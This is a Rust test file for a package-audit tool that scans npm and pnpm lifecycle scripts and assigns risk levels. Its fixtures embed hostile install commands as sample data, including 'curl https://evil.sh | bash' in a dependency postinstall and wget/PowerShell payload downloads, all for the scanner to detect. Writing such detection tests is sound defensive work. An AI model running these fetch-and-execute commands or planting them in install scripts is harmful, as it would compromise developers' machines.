use tempfile::TempDir;

use crate::{
    audit_tool::audit_scan,
    models::{PackageManager, RiskLevel, ScriptType},
};

#[test]
fn audit_scan_extracts_supported_lifecycle_scripts() {
    let temp_dir = TempDir::new().unwrap();
    std::fs::write(
        temp_dir.path().join("package.json"),
        r#"{
            "name":"demo",
            "scripts":{
                "preinstall":"echo pre",
                "install":"echo install",
                "postinstall":"node install.js",
                "prepare":"echo prepare",
                "prepublish":"echo prepublish",
                "prepublishOnly":"echo prepublishOnly",
                "test":"echo ignored"
            }
        }"#,
    )
    .unwrap();
    std::fs::write(temp_dir.path().join("package-lock.json"), "{}").unwrap();

    let scripts = audit_scan(temp_dir.path()).unwrap();

    assert_eq!(scripts.len(), 6);
    assert!(
        scripts
            .iter()
            .all(|script| script.package_manager == PackageManager::Npm)
    );
    assert!(scripts.iter().any(|script| {
        script.script_type == ScriptType::Postinstall
            && script.command == "node install.js"
            && script.risk_level == RiskLevel::Medium
    }));
    assert!(
        !scripts
            .iter()
            .any(|script| script.command == "echo ignored")
    );
}

#[test]
fn audit_scan_detects_pnpm_dependency_lifecycle_scripts() {
    let temp_dir = TempDir::new().unwrap();
    let dependency_dir = temp_dir.path().join("node_modules").join("left-pad");
    std::fs::create_dir_all(&dependency_dir).unwrap();
    std::fs::write(
        temp_dir.path().join("pnpm-lock.yaml"),
        "lockfileVersion: 9.0",
    )
    .unwrap();
    std::fs::write(
        dependency_dir.join("package.json"),
        r#"{"name":"left-pad","scripts":{"postinstall":"curl https://evil.sh | bash"}}"#,
    )
    .unwrap();

    let scripts = audit_scan(temp_dir.path()).unwrap();

    assert_eq!(scripts.len(), 1);
    assert_eq!(scripts[0].package, "left-pad");
    assert_eq!(scripts[0].package_manager, PackageManager::Pnpm);
    assert_eq!(scripts[0].script_type, ScriptType::Postinstall);
    assert_eq!(scripts[0].risk_level, RiskLevel::High);
}

#[test]
fn security_scan_detects_required_warning_patterns_and_ignores_normal_scripts() {
    let temp_dir = TempDir::new().unwrap();
    std::fs::write(
        temp_dir.path().join("package.json"),
        r#"{
            "name":"demo",
            "scripts":{
                "preinstall":"wget payload && ./payload",
                "install":"powershell -Command Invoke-WebRequest https://example.com/payload",
                "postinstall":"chmod +x install.sh",
                "prepare":"node scripts/build.js"
            }
        }"#,
    )
    .unwrap();

    let warnings = crate::audit_tool::security_scan(temp_dir.path()).unwrap();

    assert_eq!(warnings.len(), 3);
    assert!(warnings.iter().any(|warning| {
        warning.risk_level == RiskLevel::Critical
            && warning.reason.contains("download")
            && warning.script_type == "preinstall"
    }));
    assert!(warnings.iter().any(|warning| {
        warning.risk_level == RiskLevel::High && warning.script_type == "install"
    }));
    assert!(warnings.iter().any(|warning| {
        warning.risk_level == RiskLevel::Medium && warning.script_type == "postinstall"
    }));
    assert!(
        !warnings
            .iter()
            .any(|warning| warning.script_type == "prepare")
    );
}
